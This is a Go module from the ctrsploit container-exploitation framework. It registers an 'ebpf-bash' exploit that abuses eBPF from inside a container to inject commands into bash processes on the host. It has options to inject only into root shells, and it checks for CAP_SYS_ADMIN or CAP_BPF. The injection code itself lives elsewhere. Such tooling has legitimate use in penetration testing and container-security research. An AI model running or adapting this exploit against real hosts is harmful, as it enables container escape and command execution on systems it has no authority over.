package bash

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v3"
)

var (
	aliases = []string{"bash"}
	// TODO: implement flags
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "cmd",
			Aliases: []string{"c"},
			Usage:   "command to execute, default: id",
			Value:   "id",
		},
		&cli.BoolFlag{
			Name:    "once",
			Aliases: []string{"o"},
			Usage:   "exit after injecting once",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "root",
			Aliases: []string{"r"},
			Usage:   "only inject root shells",
			Value:   false,
		},
	}
	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd     = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-bash",
		Description: "abuse eBPF to inject malicious commands into bash processes running on host",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Or(
			&capability.CapSysAdminBnd,
			&capability.CapBpfBnd,
		),
		ExploitablePrerequisites: &capability.CapSysAdminEff,
	},
}

func (v *vulnerability) Exploit(cmd *cli.Command) (err error) {
	if err := v.BaseVulnerability.Exploit(cmd); err != nil {
		return err
	}
	cmdStr := cmd.String("cmd")
	return Exploit(cmdStr)
}

func Exploit(cmd string) error {
	return Load(cmd)
}
